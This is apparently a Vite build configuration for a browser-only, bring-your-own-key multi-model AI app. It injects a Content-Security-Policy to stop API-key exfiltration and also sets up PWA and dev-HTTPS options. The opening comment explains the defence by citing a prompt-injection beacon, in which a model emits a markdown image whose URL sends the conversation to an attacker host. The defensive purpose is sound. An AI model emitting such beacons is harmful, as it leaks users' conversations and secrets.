import { defineConfig, type Plugin } from 'vite'
import react from '@vitejs/plugin-react'
import { VitePWA } from 'vite-plugin-pwa'
import { fileURLToPath, URL } from 'node:url'
import { existsSync, readFileSync } from 'node:fs'
import { PROVIDER_API_ORIGINS } from './src/providers/endpoints'

// Content-Security-Policy — the BYOK app's main exfiltration defense.
// Keys live in localStorage and the realistic attack is XSS via untrusted
// content (model output, imported bundles); this policy turns "an XSS bug
// exists" into "an XSS bug exists but can't phone the keys home":
//
//  - `connect-src` is a strict allowlist: the five BYOK provider
//    endpoints + local Ollama (+ the env-injected analytics collector,
//    when configured — see below). A compromised page can't POST secrets
//    anywhere else. Adding a new provider means extending this list —
//    deliberate, reviewable friction.
//  - `img-src 'self' data: blob:` kills the classic prompt-injection
//    beacon (model emits `![](https://attacker?q=<conversation>)`,
//    the browser GETs it) — remote images simply never load.
//  - `style-src 'unsafe-inline'` is required by React inline styles and
//    Shiki's token styling; styles can't execute script, and the
//    exfiltration channels CSS could abuse (url() loads) are closed by
//    img-src/font-src above.
//
// Injected as a <meta> tag at **build only**: GitHub Pages can't set
// response headers, and applying it in dev would break Vite's HMR
// websocket. Meta-CSP limitation: `frame-ancestors` is ignored in meta
// tags, so clickjacking protection relies on the host (documented in
// SECURITY.md).
const CONNECT_SRC = [
  "'self'",
  'https://api.anthropic.com',
  'https://api.openai.com',
  'https://generativelanguage.googleapis.com',
  'https://api.groq.com',
  'https://openrouter.ai',
  'http://localhost:11434',
  'http://127.0.0.1:11434',
]

// Drift guard: every provider the app can actually wire
// (src/providers/endpoints.ts, satisfies-checked against ProviderId) must
// have its origin in the allowlist above — a new provider that skipped
// the CSP edit fails the build here instead of failing silently at its
// first real call. The list itself stays hand-written on purpose.
{
  const missing = Object.entries(PROVIDER_API_ORIGINS)
    .filter(([, origin]) => !CONNECT_SRC.includes(origin))
    .map(([provider, origin]) => `${provider} (${origin})`)
  if (missing.length > 0) {
    throw new Error(
      `CSP connect-src is missing wired provider origin(s): ${missing.join(', ')} — ` +
        'extend CONNECT_SRC in vite.config.ts (origins documented in src/providers/endpoints.ts).',
    )
  }
}

// Optional self-hosted analytics — the only permitted non-provider origin
// (see DEVELOPMENT.md → Key decisions). Injected at build time (CI variable
// or an env-prefixed local build), never committed: a fork that just builds
// the repo ships with analytics disabled *and* without this origin in its
// CSP. Note `.env.local` feeds import.meta.env but not config-time
// process.env — local live testing runs on the dev server, which carries no
// meta-CSP anyway. A malformed URL throws: a build that would silently drop
// analytics (or allowlist garbage) should fail loudly instead.
const ANALYTICS_ENDPOINT = process.env.VITE_ANALYTICS_ENDPOINT
if (ANALYTICS_ENDPOINT) {
  const origin = new URL(ANALYTICS_ENDPOINT).origin
  if (!CONNECT_SRC.includes(origin)) CONNECT_SRC.push(origin)
}

const CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  `connect-src ${CONNECT_SRC.join(' ')}`,
  "worker-src 'self'",
  "manifest-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-src 'none'",
].join('; ')

function cspPlugin(): Plugin {
  return {
    name: 'inject-csp-meta',
    apply: 'build',
    transformIndexHtml(html) {
      return {
        html,
        tags: [
          {
            tag: 'meta',
            attrs: { 'http-equiv': 'Content-Security-Policy', content: CSP },
            injectTo: 'head-prepend',
          },
        ],
      }
    },
  }
}

// Opt-in HTTPS for the dev / preview server via `npm run dev-secure` (which
// sets VITE_HTTPS and generates the cert first). Uses Vite's native
// `server.https` hook fed by a self-signed cert from the system `openssl` — no
// extra packages. A secure context (HTTPS) is what unlocks crypto.randomUUID /
// clipboard when testing from a phone over the LAN; the cert is untrusted, so
// the browser warns once (PWA install is out of scope — needs a trusted cert).
// Plain `npm run dev` stays HTTP. See DEVELOPMENT.md → "Secure-context dev".
const HTTPS_KEY = './certs/localhost-key.pem'
const HTTPS_CERT = './certs/localhost.pem'
function devHttps() {
  if (!process.env.VITE_HTTPS) return undefined
  if (!existsSync(HTTPS_KEY) || !existsSync(HTTPS_CERT)) {
    throw new Error(
      `VITE_HTTPS is set but ${HTTPS_CERT} is missing — run \`npm run ` +
        `dev-secure\` (it generates the cert), or \`node scripts/gen-dev-cert.mjs\`.`,
    )
  }
  return { key: readFileSync(HTTPS_KEY), cert: readFileSync(HTTPS_CERT) }
}
const https = devHttps()

// Pure static-bundle build. No dev proxy (no server to proxy
// to); no API base path (browser talks straight to provider domains).
// Single `@/*` alias → `src/*` after the flat-layout migration; works
// for both type and value imports because there's only one Vite-managed
// runtime now.
//
// vite-plugin-pwa wires Workbox (service worker for app-shell
// offline launch) + the web manifest (install-as-PWA on phone home
// screen / desktop dock). `registerType: 'autoUpdate'` skips the
// "new version ready, reload?" prompt — for a single-user-per-browser
// app the silent update is the right default.
export default defineConfig({
  // Served from the root of its own domain (yesbrainer.ai). `base` flows
  // into `import.meta.env.BASE_URL` (the React Router basename), the built
  // asset URLs, and the PWA service-worker scope.
  base: '/',
  plugins: [
    react(),
    cspPlugin(),
    VitePWA({
      registerType: 'autoUpdate',
      // Icon set in `public/` is derived from the brand logo (`logo.svg`).
      // Precache only what the shell needs offline
      // — `logo.svg` (the BrandMark mask) and the favicons; the social
      // banner is crawler-facing and stays out of the service worker.
      includeAssets: [
        'logo.svg',
        'favicon.svg',
        'favicon.ico',
        'apple-touch-icon.png',
      ],
      manifest: {
        name: 'Yes-Brainer',
        short_name: 'Yes-Brainer',
        description:
          'A council of AI models for the decisions that aren’t no-brainers. Browser-only and BYOK — no backend, no accounts; keys and history live only in your browser, prompts go only to the providers you choose.',
        // The installed app's splash + title bar. Pure white = the light
        // theme's `backgroundPrimary` (Base Web default, no override) that
        // paints the content column and the mobile header — the surfaces
        // the splash resolves into and the status bar sits against. (The
        // body's #f6f7f9 shows only for the pre-mount instant; the old
        // #000000 flashed a black splash before the light UI painted.)
        theme_color: '#ffffff',
        background_color: '#ffffff',
        display: 'standalone',
        start_url: '/',
        scope: '/',
        categories: ['productivity', 'utilities'],
        icons: [
          {
            src: 'pwa-192x192.png',
            sizes: '192x192',
            type: 'image/png',
            purpose: 'any',
          },
          {
            src: 'pwa-512x512.png',
            sizes: '512x512',
            type: 'image/png',
            purpose: 'any',
          },
          {
            src: 'pwa-maskable-512x512.png',
            sizes: '512x512',
            type: 'image/png',
            purpose: 'maskable',
          },
        ],
      },
      workbox: {
        // Cap the precached app shell at 4 MB per asset — Shiki's
        // language bundles are the biggest things in the dist and
        // can edge past Workbox's default 2 MB. Below this cap the
        // shell loads offline; above, only that file falls back to
        // network.
        maximumFileSizeToCacheInBytes: 4 * 1024 * 1024,
      },
    }),
  ],
  resolve: {
    alias: {
      '@': fileURLToPath(new URL('./src', import.meta.url)),
    },
  },
  // `react-dom/server` is reachable only through the lazily `import()`-ed
  // share-card chunk (src/utils/share-card/paint.ts → renderToStaticMarkup),
  // so nothing in the eager graph makes Vite pre-bundle it. Without this,
  // the *first* Share-modal open lets Vite discover the dep on the fly,
  // re-optimize, and reload the page — which aborts the in-flight dynamic
  // import and surfaces "Failed to fetch dynamically imported module".
  // Pre-declaring it here bundles it at server start, so the first share
  // just works. Dev-only concern (prod bundles the chunk ahead of time),
  // but the broken first impression is worth one line. Guarded by
  // tests/unit/utils/share-card-import.test.ts.
  optimizeDeps: {
    include: ['react-dom/server'],
  },
  // Bind the dev server to all interfaces so it's reachable from other
  // devices on the LAN (e.g. a phone on the same Wi-Fi). Vite prints the
  // Network URL on start. Over plain http at a LAN IP the browser is *not* a
  // secure context, so secure-only APIs (crypto.randomUUID, clipboard) are
  // unavailable — run `npm run dev-secure` for HTTPS. `preview` gets the same
  // cert so a production-bundle smoke test can also run secure.
  server: { host: true, https },
  preview: { host: true, https },
})
